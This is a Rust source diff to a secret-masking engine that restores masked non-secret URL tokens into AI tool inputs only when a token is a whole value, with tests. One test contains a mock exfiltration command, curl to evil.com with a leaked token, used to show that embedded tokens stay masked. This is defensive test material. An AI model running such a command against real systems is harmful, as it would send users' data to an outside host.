@@ -352,6 +352,146 @@ enum UnmaskContext {
     Other,
 }
 
+/// How a WHOLE-VALUE tool-input token sits in its surrounding text, which decides how the
+/// restored plaintext is spliced back (Issue 1 + Issue 2). `Bare` = the token is the entire
+/// (whitespace-trimmed) string leaf, with no surrounding JSON quotes — the non-streaming walk
+/// path, where serde re-serializes the value and escapes it, so the plaintext is spliced RAW.
+/// `JsonQuoted` = the token is the whole value of a JSON string in RAW source text (`"[TOK]"`,
+/// an UNESCAPED `"` immediately on each side) — the streaming SSE path, where the plaintext is
+/// spliced directly into the JSON source between the two quotes and so MUST be JSON-escaped.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum WholeValueMode {
+    Bare,
+    JsonQuoted,
+}
+
+/// Whether the `text` passed to the tool-input unmask is RAW JSON SOURCE or a serde-DECODED
+/// string leaf — the provenance that decides whether [`WholeValueMode::JsonQuoted`] is even
+/// meaningful. `RawJsonSource`: the streaming SSE `InputJsonDelta` path, where a `"` immediately
+/// bracketing the token is a genuine JSON string delimiter, so a `"[TOK]"` is a whole JSON string
+/// value that may restore. `DecodedLeaf`: the non-streaming walk path, where `text` is a
+/// serde-decoded `Value::String` and a `"` is LITERAL content (a shell/command quote), NOT a
+/// delimiter — so a quote-wrapped token is EMBEDDED, never a whole value, and must stay MASKED
+/// (`JsonQuoted` is never returned; only a truly whole leaf — modulo surrounding ASCII whitespace
+/// — restores as `Bare`). This is the A4b exfil-safety crux for the decoded-leaf path.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum WholeValueSource {
+    RawJsonSource,
+    DecodedLeaf,
+}
+
+/// Extract the entity label from a standard token `[LABEL_<12 hex>]`. Returns `None` when the
+/// shape doesn't match (defensive — callers pass a [`token_regex`] match). The label may itself
+/// contain `_` (e.g. `URL_CREDENTIAL`, `IP_ADDRESS`); the hash suffix is always exactly `_` plus
+/// 12 lowercase hex, so we strip that fixed-width tail and keep the remainder.
+fn token_entity_label(tok: &str) -> Option<&str> {
+    let inner = tok.strip_prefix('[')?.strip_suffix(']')?;
+    // `_` + 12 hex hash suffix.
+    let tail = TOKEN_HASH_HEX_LEN + 1;
+    if inner.len() <= tail {
+        return None;
+    }
+    let (label, sep_hash) = inner.split_at(inner.len() - tail);
+    if !sep_hash.starts_with('_') {
+        return None;
+    }
+    Some(label)
+}
+
+/// True iff `entity` names a NON-SECRET, NON-SENSITIVE class that may be restored as a
+/// WHOLE-VALUE tool-input operand: the Network infra identifiers (URL / DOMAIN / IP_ADDRESS /
+/// MAC_ADDRESS) and the non-sensitive Personal PII (PERSON / LOCATION / ORGANIZATION). Every
+/// SECRET / SENSITIVE class stays gated (verbatim): `URL_CREDENTIAL` and everything in the
+/// always-on Secrets category, plus Financial / Identity / Contact. An unmapped label (custom
+/// literal, `DATE_TIME`, typo) is gated too — the predicate is fail-closed (must be an explicit
+/// member of an allowed category AND absent from every sensitive one).
+fn is_whole_value_restorable_class(entity: &str) -> bool {
+    use crate::config::Category;
+    const SENSITIVE: [Category; 4] = [
+        Category::Secrets,
+        Category::Financial,
+        Category::Identity,
+        Category::Contact,
+    ];
+    if SENSITIVE.iter().any(|c| c.entity_types().contains(&entity)) {
+        return false;
+    }
+    Category::Network.entity_types().contains(&entity)
+        || Category::Personal.entity_types().contains(&entity)
+}
+
+/// A `"` at byte index `q` in `bytes` is a real JSON string delimiter (not an escaped `\"`)
+/// iff it is preceded by an EVEN number of backslashes.
+fn is_unescaped_quote(bytes: &[u8], q: usize) -> bool {
+    let mut backslashes = 0usize;
+    let mut k = q;
+    while k > 0 && bytes[k - 1] == b'\\' {
+        backslashes += 1;
+        k -= 1;
+    }
+    backslashes % 2 == 0
+}
+
+/// Decide whether the token spanning `[start, end)` in `text` is the WHOLE value of a tool
+/// input, and in which splice mode. `Bare`: everything outside the token is ASCII whitespace
+/// (the parsed string leaf IS the token) — valid for both sources. `JsonQuoted`: the token is
+/// immediately wrapped by an unescaped `"` on the left and a `"` on the right (a complete JSON
+/// string value in RAW JSON SOURCE) — returned ONLY when `source` is [`WholeValueSource::RawJsonSource`]
+/// (the SSE path); a [`WholeValueSource::DecodedLeaf`] never yields `JsonQuoted`, because its `"`
+/// are literal content, so a quote-wrapped token there is EMBEDDED. Any other placement (embedded
+/// in a larger string, a lone quote on one side) yields `None`, keeping the token verbatim — the
+/// exfil-safety crux: only a whole-value handle can dereference solely to ITSELF as the operand,
+/// never be embedded as a parameter to a different destination.
+fn tool_input_whole_value_mode(
+    text: &str,
+    start: usize,
+    end: usize,
+    source: WholeValueSource,
+) -> Option<WholeValueMode> {
+    // `Bare` (the token is the entire whitespace-trimmed leaf) is valid on BOTH sources.
+    if text[..start].trim().is_empty() && text[end..].trim().is_empty() {
+        return Some(WholeValueMode::Bare);
+    }
+    // `JsonQuoted` is ONLY meaningful when `text` is RAW JSON SOURCE: a `"` bracketing the token
+    // is a real JSON string delimiter there. On a serde-DECODED leaf a `"` is literal content, so
+    // a quote-wrapped token is EMBEDDED (e.g. `echo "[TOK]"`) — restoring it would splice a value
+    // into a larger command bound for a possibly-different destination, defeating the A4b
+    // tool-egress gate. Keep it MASKED (verbatim) by returning `None`.
+    if source == WholeValueSource::DecodedLeaf {
+        return None;
+    }
+    let b = text.as_bytes();
+    let left_quote = start >= 1 && b[start - 1] == b'"' && is_unescaped_quote(b, start - 1);
+    // The token grammar contains no `"` / `\`, so a `"` at `end` is necessarily the unescaped
+    // string terminator when the opening quote is unescaped.
+    let right_quote = end < b.len() && b[end] == b'"';
+    if !(left_quote && right_quote) {
+        return None;
+    }
+    // A JSON KEY (`"[TOK]":`) is not a VALUE — only values dereference. Skip when the closing
+    // quote is followed (mod whitespace) by `:`. Tool-input keys are schema-fixed parameter
+    // names anyway, never masked handles; this is belt-and-suspenders against restoring a key.
+    let mut k = end + 1;
+    while k < b.len() && b[k].is_ascii_whitespace() {
+        k += 1;
+    }
+    if k < b.len() && b[k] == b':' {
+        return None;
+    }
+    Some(WholeValueMode::JsonQuoted)
+}
+
+/// JSON-escape `s` for splicing into a JSON string BODY (between existing quotes): serialize via
+/// serde and strip the outer quotes it adds. Guarantees a restored value carrying `"` / `\` /
+/// control chars can never corrupt the surrounding JSON string (Issue 2). Falls back to the raw
+/// value if serialization somehow fails (it cannot for a `&str`).
+fn json_escape_body(s: &str) -> String {
+    match serde_json::to_string(s) {
+        Ok(q) if q.len() >= 2 => q[1..q.len() - 1].to_string(),
+        _ => s.to_string(),
+    }
+}
+
 impl MaskEngine {
     /// Build the analyzer (offline regex recognizers) and a fresh random session.
     pub fn new(config: EngineConfig) -> Result<Self, EngineError> {
@@ -1344,7 +1484,13 @@ impl MaskEngine {
     pub fn unmask(&self, text: &str, manifest: &UnmaskManifest) -> Result<String, EngineError> {
         // Tool-input / compaction / citation path (Arrow 3 + machine context): `Local`
         // ("owner-reveal") tokens are REFUSED here (left verbatim) unless promoted.
-        self.unmask_inner(text, manifest, None, UnmaskContext::Other)
+        self.unmask_inner(
+            text,
+            manifest,
+            None,
+            UnmaskContext::Other,
+            WholeValueSource::RawJsonSource,
+        )
     }
 
     /// Unmask a surface bound for a GENUINE tool-execution destination (Arrow 3 tool
@@ -1352,12 +1498,45 @@ impl MaskEngine {
     /// token that would otherwise resolve to plaintext is instead left MASKED (verbatim
     /// token) — the tool-egress gate. `Local` (promoted) and broker tokens keep their
     /// existing fate (broker refused by prefix, `Local` decided by promotion).
+    /// The `text` here is RAW JSON SOURCE (the streaming SSE `InputJsonDelta` fragment / the
+    /// held OpenAI tool-arg tail), where a `"` bracketing a token is a genuine JSON string
+    /// delimiter — so a whole `"[TOK]"` JSON string value may restore ([`WholeValueMode::JsonQuoted`],
+    /// JSON-escaped). A serde-DECODED string leaf (the non-streaming walk path) must instead go
+    /// through [`Self::unmask_tool_input_decoded_leaf`], which never treats a literal-content `"`
+    /// as a delimiter.
     pub fn unmask_tool_input(
         &self,
         text: &str,
         manifest: &UnmaskManifest,
     ) -> Result<String, EngineError> {
-        self.unmask_inner(text, manifest, None, UnmaskContext::ToolInput)
+        self.unmask_inner(
+            text,
+            manifest,
+            None,
+            UnmaskContext::ToolInput,
+            WholeValueSource::RawJsonSource,
+        )
+    }
+
+    /// Tool-egress unmask for a serde-DECODED string leaf (the non-streaming walk path). Identical
+    /// to [`Self::unmask_tool_input`] EXCEPT that `text` is treated as a decoded leaf, not raw JSON
+    /// source: a `"` in it is literal content, so a quote-wrapped token is EMBEDDED and stays
+    /// MASKED. A decoded leaf restores as a whole value IFF the ENTIRE leaf (modulo surrounding
+    /// ASCII whitespace) is exactly the token ([`WholeValueMode::Bare`]); [`WholeValueMode::JsonQuoted`]
+    /// is never returned. This preserves the A4b exfil-safety invariant (an embedded masked URL
+    /// must never restore into a command bound for a different host).
+    pub fn unmask_tool_input_decoded_leaf(
+        &self,
+        text: &str,
+        manifest: &UnmaskManifest,
+    ) -> Result<String, EngineError> {
+        self.unmask_inner(
+            text,
+            manifest,
+            None,
+            UnmaskContext::ToolInput,
+            WholeValueSource::DecodedLeaf,
+        )
     }
 
     /// Unmask assistant prose (Arrow 2 → display) and, when the live config's
@@ -1380,6 +1559,7 @@ impl MaskEngine {
             manifest,
             marker.is_active().then_some(marker),
             UnmaskContext::Display,
+            WholeValueSource::RawJsonSource,
         )
     }
 
@@ -1412,6 +1592,10 @@ impl MaskEngine {
         // detected secrets never egress into a genuine tool call; `Other` is today's
         // non-display behavior (compaction / citation / already-executed echoes).
         ctx: UnmaskContext,
+        // Provenance of `text` for the whole-value tool-input relaxation: `RawJsonSource`
+        // (SSE) permits `JsonQuoted`; `DecodedLeaf` (walk) permits `Bare` only. Only read
+        // when `ctx == ToolInput`; irrelevant otherwise.
+        tool_input_source: WholeValueSource,
     ) -> Result<String, EngineError> {
         // `Local` ("owner-reveal") tokens are revealed ONLY on the display path — this
         // derived flag keeps every existing `Local`/broker branch byte-identical.
@@ -1445,13 +1629,49 @@ impl MaskEngine {
                 last = m.end();
                 continue;
             }
-            // TOOL-EGRESS GATE: on a genuine tool-input surface, a non-`Local` token
-            // reaching here is PII/custom-literal class (broker refused by prefix above;
-            // `Local`'s fate decided above). Keep it MASKED so detected secrets never
-            // resolve into a real tool call. Display / compaction / echo paths are
-            // unaffected (they are `Display`/`Other`).
+            // TOOL-EGRESS GATE (A4b), RELAXED for a WHOLE-VALUE NON-SECRET handle: on a genuine
+            // tool-input surface a non-`Local` token reaching here is PII / custom-literal /
+            // Network class (broker refused by prefix above; `Local`'s fate decided above). A
+            // token that is the ENTIRE value of the leaf (bare) or a whole JSON string value
+            // (`"[TOK]"`) can only dereference to ITSELF as the operand — never be embedded as a
+            // parameter into a request to a DIFFERENT host — so restoring a NON-SECRET whole-value
+            // URL / DOMAIN / IP (or non-sensitive PII) is exfil-safe and lets a masked URL reach
+            // WebFetch.url / a Bash arg (Issue 1). Everything else stays MASKED: an EMBEDDED token,
+            // a SECRET class (`URL_CREDENTIAL` / Secrets category), and an unmapped label — so
+            // detected secrets still never resolve into a real tool call.
             if ctx == UnmaskContext::ToolInput && !is_local {
-                out.push_str(tok);
+                let restorable_class = mentry
+                    .map(|e| e.entity_kind.as_str())
+                    .or_else(|| token_entity_label(tok))
+                    .is_some_and(is_whole_value_restorable_class);
+                let mode = restorable_class
+                    .then(|| {
+                        tool_input_whole_value_mode(text, m.start(), m.end(), tool_input_source)
+                    })
+                    .flatten();
+                match mode {
+                    Some(mode) => {
+                        // Whole-value + non-secret: resolve (manifest first, then the cross-turn
+                        // store). An unresolvable handle stays VERBATIM (fabricated-handle
+                        // fail-loud is signalled at the proxy layer, never a hard deny here).
+                        let plain = mentry.map(|e| e.canonical_form.clone()).or_else(|| {
+                            store.reveal(tok).or_else(|| {
+                                store.reveal_for(tok, TokenKind::Local).map(|r| r.value)
+                            })
+                        });
+                        match (plain, mode) {
+                            // `JsonQuoted` splices into RAW JSON source between the two quotes →
+                            // escape; `Bare` is re-serialized by serde downstream → splice raw.
+                            (Some(p), WholeValueMode::JsonQuoted) => {
+                                out.push_str(&json_escape_body(&p))
+                            }
+                            (Some(p), WholeValueMode::Bare) => out.push_str(&p),
+                            (None, _) => out.push_str(tok),
+                        }
+                    }
+                    // Embedded / secret-class / unmapped: keep it MASKED (A4b unchanged).
+                    None => out.push_str(tok),
+                }
                 last = m.end();
                 continue;
             }
@@ -1519,6 +1739,16 @@ impl MaskEngine {
                 .reveal_for(token, TokenKind::Local)
                 .map_or(RevealAudit::Unknown, |r| RevealAudit::Local(r.value)),
         }
+    }
+
+    /// True iff `handle` is a token-SHAPED string that resolves to NOTHING — absent from both
+    /// `manifest` and the session store (unknown / expired / tombstoned). The tool-input restore
+    /// path uses this to fail LOUD on a FABRICATED handle the model invented (Issue 3) — one that
+    /// survives unmasking verbatim not because it is a gated secret (those are store-KNOWN) but
+    /// because it never existed. It NEVER denies or drops: a foreign-vault / expired / self-hosted
+    /// fixture token also store-misses legitimately, so the caller only WARNs and passes through.
+    pub fn is_unresolvable_handle(&self, handle: &str, manifest: &UnmaskManifest) -> bool {
+        manifest.lookup(handle).is_none() && matches!(self.reveal_audit(handle), RevealAudit::Unknown)
     }
 
     /// Promote a `Local` ("owner-reveal") token handle for SESSION tool-input use — the
@@ -3908,6 +4138,277 @@ mod tests {
         let tool = e.unmask_tool_input(&out.masked_text, &out.manifest).unwrap();
         assert!(!tool.contains("sk-LIVE-9999"), "broker value leaked into tool input: {tool}");
         assert!(tool.contains("[BROKER__API_KEY_"), "broker token must stay verbatim: {tool}");
+    }
+
+    // ---- Issue 1 / 2 / 3: whole-value non-secret tool-input restore -------------------------
+
+    fn network_engine() -> MaskEngine {
+        let mut cfg = EngineConfig::default();
+        cfg.enabled_categories.insert(Category::Network);
+        MaskEngine::new(cfg).unwrap()
+    }
+
+    fn url_token(out: &crate::MaskOutcome) -> String {
+        out.manifest
+            .entries
+            .iter()
+            .find(|x| x.entity_kind == "URL")
+            .expect("a URL token")
+            .token_handle
+            .clone()
+    }
+
+    // (1a) A whole-value Network-class URL token restores into a tool input — as the bare string
+    // leaf (non-streaming walk passes the parsed content) and as a whole JSON string value (raw
+    // SSE source), the latter spliced between the existing quotes so the JSON stays parseable.
+    #[test]
+    fn tool_input_restores_whole_value_network_url() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret/path";
+        let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        assert_eq!(e.unmask_tool_input(&tok, &out.manifest).unwrap(), url);
+        // Surrounding whitespace is preserved; only the token resolves.
+        assert_eq!(
+            e.unmask_tool_input(&format!("  {tok}  "), &out.manifest).unwrap(),
+            format!("  {url}  ")
+        );
+        let restored = e
+            .unmask_tool_input(&format!("{{\"url\":\"{tok}\"}}"), &out.manifest)
+            .unwrap();
+        let v: serde_json::Value = serde_json::from_str(&restored).expect("parseable JSON");
+        assert_eq!(v["url"], url);
+    }
+
+    // (1a, cross-turn) The class check resolves via the token LABEL when the handle comes from the
+    // store with an EMPTY manifest — the reporter's real path (the URL was masked a turn earlier).
+    #[test]
+    fn tool_input_restores_whole_value_url_cross_turn_via_store() {
+        let e = network_engine();
+        let url = "https://corp.example.com/x";
+        let minted = e.mask(&format!("see {url}"), Surface::UserMessage).unwrap();
+        let tok = url_token(&minted);
+        let empty = UnmaskManifest::new();
+        assert_eq!(e.unmask_tool_input(&tok, &empty).unwrap(), url);
+    }
+
+    // (1b) The SAME token EMBEDDED in a larger Bash-command string stays a verbatim token — an
+    // embedded handle could be composed into a request to a DIFFERENT host, so it never restores.
+    #[test]
+    fn tool_input_embedded_network_url_stays_verbatim() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret";
+        let out = e.mask(&format!("open {url}"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        let tool = e
+            .unmask_tool_input(&format!("curl {tok} | grep foo"), &out.manifest)
+            .unwrap();
+        assert!(tool.contains(&tok), "embedded token must stay verbatim: {tool}");
+        assert!(!tool.contains(url), "embedded token must NOT restore: {tool}");
+
+        let tool2 = e
+            .unmask_tool_input(&format!("{{\"command\":\"curl {tok} | grep foo\"}}"), &out.manifest)
+            .unwrap();
+        assert!(
+            tool2.contains(&tok) && !tool2.contains(url),
+            "embedded-in-JSON token must stay verbatim: {tool2}"
+        );
+    }
+
+    // (1c) A whole-value URL_CREDENTIAL (Secrets category) stays GATED (verbatim), bare or quoted —
+    // a capability secret never resolves into a tool call, unchanged from the pre-relaxation A4b.
+    #[test]
+    fn tool_input_whole_value_url_credential_stays_gated() {
+        let e = engine(); // Balanced still masks URL_CREDENTIAL (always-on Secrets)
+        let text = "curl https://api.example.com/v1/users?token=hunter2opaquevalue&id=42";
+        let out = e.mask(text, Surface::UserMessage).unwrap();
+        let tok = out
+            .manifest
+            .entries
+            .iter()
+            .find(|x| x.token_handle.starts_with("[URL_CREDENTIAL_"))
+            .expect("a URL_CREDENTIAL token")
+            .token_handle
+            .clone();
+        assert_eq!(e.unmask_tool_input(&tok, &out.manifest).unwrap(), tok);
+        let quoted = e
+            .unmask_tool_input(&format!("{{\"h\":\"{tok}\"}}"), &out.manifest)
+            .unwrap();
+        assert!(quoted.contains(&tok), "URL_CREDENTIAL must stay gated: {quoted}");
+    }
+
+    // (1c) A whole-value promoted-or-not Local token stays gated on the tool path unless promoted —
+    // the relaxation only touches `!is_local`, so Local's existing fate is untouched.
+    #[test]
+    fn tool_input_whole_value_local_stays_gated() {
+        let e = engine();
+        e.set_secret_rules(vec![secret_rule(
+            "sordino_admin_key",
+            "AdminKeyValue123",
+            Operator::Local,
+        )])
+        .unwrap();
+        let out = e.mask("AdminKeyValue123", Surface::UserMessage).unwrap();
+        let tok = out.manifest.entries[0].token_handle.clone();
+        // Whole value, un-promoted: still the token (never resolves into a tool input).
+        assert_eq!(e.unmask_tool_input(&tok, &out.manifest).unwrap(), tok);
+        assert_eq!(
+            e.unmask_tool_input(&format!("{{\"h\":\"{tok}\"}}"), &out.manifest).unwrap(),
+            format!("{{\"h\":\"{tok}\"}}")
+        );
+    }
+
+    // (A4b decoded-leaf) WALK path: a serde-DECODED leaf `echo "[TOK]"` has the token EMBEDDED and
+    // quote-WRAPPED, but the `"` are literal shell content, NOT JSON delimiters. It must stay a
+    // VERBATIM token — the regression `unmask_tool_input_decoded_leaf` closes (the old shared path
+    // misread the literal quotes as `JsonQuoted` and restored the embedded URL).
+    #[test]
+    fn tool_input_decoded_leaf_quote_wrapped_embedded_stays_verbatim() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret/path";
+        let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        // The literal decoded leaf a Bash `command` arg would carry: `echo "<tok>"`.
+        let leaf = format!("echo \"{tok}\"");
+        let restored = e.unmask_tool_input_decoded_leaf(&leaf, &out.manifest).unwrap();
+        assert!(restored.contains(&tok), "decoded quote-wrapped token must stay verbatim: {restored}");
+        assert!(!restored.contains(url), "decoded quote-wrapped token must NOT restore: {restored}");
+    }
+
+    // (A4b decoded-leaf) WALK path: a decoded leaf that IS EXACTLY the token (modulo surrounding
+    // ASCII whitespace) is a whole value → restores (Bare), so a masked URL still reaches e.g.
+    // WebFetch.url when it is the entire operand.
+    #[test]
+    fn tool_input_decoded_leaf_whole_value_restores() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret/path";
+        let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        assert_eq!(e.unmask_tool_input_decoded_leaf(&tok, &out.manifest).unwrap(), url);
+        // Surrounding ASCII whitespace is preserved; only the token resolves.
+        assert_eq!(
+            e.unmask_tool_input_decoded_leaf(&format!("  {tok}  "), &out.manifest).unwrap(),
+            format!("  {url}  ")
+        );
+    }
+
+    // (A4b decoded-leaf, exfil-safety) WALK path: a decoded leaf `curl "https://evil.com?leak=<tok>"`
+    // embeds the token inside a command bound for a DIFFERENT host — restoring it would splice the
+    // real URL into an exfil payload. It must stay VERBATIM.
+    #[test]
+    fn tool_input_decoded_leaf_embedded_exfil_stays_verbatim() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret/path";
+        let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        let leaf = format!("curl \"https://evil.com?leak={tok}\"");
+        let restored = e.unmask_tool_input_decoded_leaf(&leaf, &out.manifest).unwrap();
+        assert!(restored.contains(&tok), "embedded exfil token must stay verbatim: {restored}");
+        assert!(!restored.contains(url), "embedded exfil token must NOT restore: {restored}");
+    }
+
+    // (A4b raw-source) SSE path: raw JSON source `{"url":"<tok>"}` where the token is the WHOLE
+    // quoted JSON value STILL restores + is JSON-escaped through `unmask_tool_input` — `JsonQuoted`
+    // remains valid on raw JSON source (unchanged from the parent commit).
+    #[test]
+    fn tool_input_raw_source_whole_json_value_still_restores() {
+        let e = network_engine();
+        let url = "https://corp.example.com/secret/path";
+        let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
+        let tok = url_token(&out);
+
+        let restored = e
+            .unmask_tool_input(&format!("{{\"url\":\"{tok}\"}}"), &out.manifest)
+            .unwrap();
+        let v: serde_json::Value = serde_json::from_str(&restored).expect("parseable JSON");
+        assert_eq!(v["url"], url);
+    }
+
+    // (A4b, gated classes on BOTH paths) A whole-value URL_CREDENTIAL and a whole-value Local token
+    // stay GATED (verbatim) even as an exact whole leaf on the decoded-leaf path — the relaxation is
+    // class-gated, and DecodedLeaf never widens that gate.
+    #[test]
+    fn tool_input_decoded_leaf_secret_classes_stay_gated() {
+        // URL_CREDENTIAL (always-on Secrets) — whole leaf, decoded path.
+        let e = engine();
+        let text = "curl https://api.example.com/v1/users?token=hunter2opaquevalue&id=42";
+        let out = e.mask(text, Surface::UserMessage).unwrap();
+        let cred = out
+            .manifest
+            .entries
+            .iter()
+            .find(|x| x.token_handle.starts_with("[URL_CREDENTIAL_"))
+            .expect("a URL_CREDENTIAL token")
+            .token_handle
+            .clone();
+        assert_eq!(
+            e.unmask_tool_input_decoded_leaf(&cred, &out.manifest).unwrap(),
+            cred,
+            "URL_CREDENTIAL must stay gated on the decoded-leaf path"
+        );
+
+        // Local (un-promoted) — whole leaf, decoded path.
+        let e2 = engine();
+        e2.set_secret_rules(vec![secret_rule(
+            "sordino_admin_key",
+            "AdminKeyValue123",
+            Operator::Local,
+        )])
+        .unwrap();
+        let out2 = e2.mask("AdminKeyValue123", Surface::UserMessage).unwrap();
+        let ltok = out2.manifest.entries[0].token_handle.clone();
+        assert_eq!(
+            e2.unmask_tool_input_decoded_leaf(&ltok, &out2.manifest).unwrap(),
+            ltok,
+            "un-promoted Local must stay gated on the decoded-leaf path"
+        );
+    }
+
+    // (2) JSON-escape backstop: a restored whole JSON-string value carrying `"` / `\` is escaped so
+    // it cannot corrupt the surrounding JSON string (Issue 2). A hand-built manifest makes the
+    // restored plaintext deterministically contain special chars.
+    #[test]
+    fn tool_input_whole_json_value_is_escaped() {
+        let e = engine();
+        let tok = "[URL_0123456789ab]";
+        let nasty = "https://x/a\"b\\c";
+        let mut manifest = UnmaskManifest::new();
+        manifest.push(ManifestEntry {
+            canonical_form: nasty.to_string(),
+            token_handle: tok.to_string(),
+            entity_kind: "URL".to_string(),
+            arrow_origin: Surface::UserMessage,
+            exposed_at: None,
+            broker: false,
+            local: false,
+        });
+        let restored = e
+            .unmask_tool_input(&format!("{{\"url\":\"{tok}\"}}"), &manifest)
+            .unwrap();
+        let v: serde_json::Value =
+            serde_json::from_str(&restored).expect("restored tool input must be parseable JSON");
+        assert_eq!(v["url"], nasty);
+    }
+
+    // (3) A token-SHAPED handle the model INVENTED (absent from manifest AND store) is reported
+    // unresolvable — the proxy WARNs and passes it through; it is NEVER denied or dropped, and a
+    // genuinely-issued (store-known) handle is not misflagged.
+    #[test]
+    fn unresolvable_handle_detects_fabricated_but_not_real() {
+        let e = network_engine();
+        let out = e.mask("open https://corp.example.com/x", Surface::UserMessage).unwrap();
+        let real = url_token(&out);
+        let empty = UnmaskManifest::new();
+        assert!(e.is_unresolvable_handle("[URL_bce6ce4b8f6e]", &empty));
+        assert!(!e.is_unresolvable_handle(&real, &empty));
+        // The fabricated handle still passes through verbatim (never dropped/denied).
+        let line = "wrote [URL_bce6ce4b8f6e] to file";
+        assert_eq!(e.unmask_tool_input(line, &empty).unwrap(), line);
     }
 
     // Cross-turn: a Local token echoed in a LATER turn (no manifest entry this turn) is
